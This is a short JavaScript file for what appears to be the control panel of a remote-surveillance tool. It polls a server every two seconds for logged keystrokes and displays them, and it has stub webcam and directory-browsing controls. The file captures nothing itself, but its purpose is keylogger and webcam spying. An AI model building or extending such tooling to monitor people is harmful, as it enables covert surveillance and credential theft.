const video_element = document.getElementById("webcam_preview");
const keybox = document.getElementById('keybox');
const dirbox = document.getElementById('dirbox');
const file_selector = document.getElementById('file_selector');

document.getElementById('back_a_dir').addEventListener('click', function () {//go back a directory button
    console.log('back_a_dir clicked');

});
document.getElementById("stop_video").addEventListener('click', function () {//stop video feed button
    console.log('stop_video clicked');

});
document.getElementById("start_video").addEventListener('click', function () {//start video feed button
    console.log('start_video clicked');

});

window.addEventListener('load', function () {
    setInterval(() => {
        //request('/action/get/keylog').then(keylog =>{ writeoutkeylog(JSON.parse(keylog)) })
        request('/action/get/keylog')
        //console.log('Keylog: ', request('/action/get/keylog')/*,' Folders: ',request('/action/get/folders')*/)
    }, 2000);
})

async function request(what) {//make a request to server
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function () {
        if (this.readyState == 4 && this.status == 200) {
            console.log('Sever responed with: ', JSON.parse(this.responseText))
            if(what == '/action/get/keylog'){//asked for keylog, should have keylog
                writeoutkeylog(JSON.parse(this.responseText))
            }
            //return this.responseText;
        }
    };

    //what must be a path
    xhttp.open("GET", what, true);
    xhttp.send();
}

function writeoutkeylog(keys) {
    console.log('write keylog: ',keys)
    keybox.innerText = "";
    
    keys.forEach(keycode => {
        var keyholder = document.createElement('div');
        keyholder.className = "keyholder"
        keyholder.innerText = keycode;
        keybox.appendChild(keyholder)
    });
}
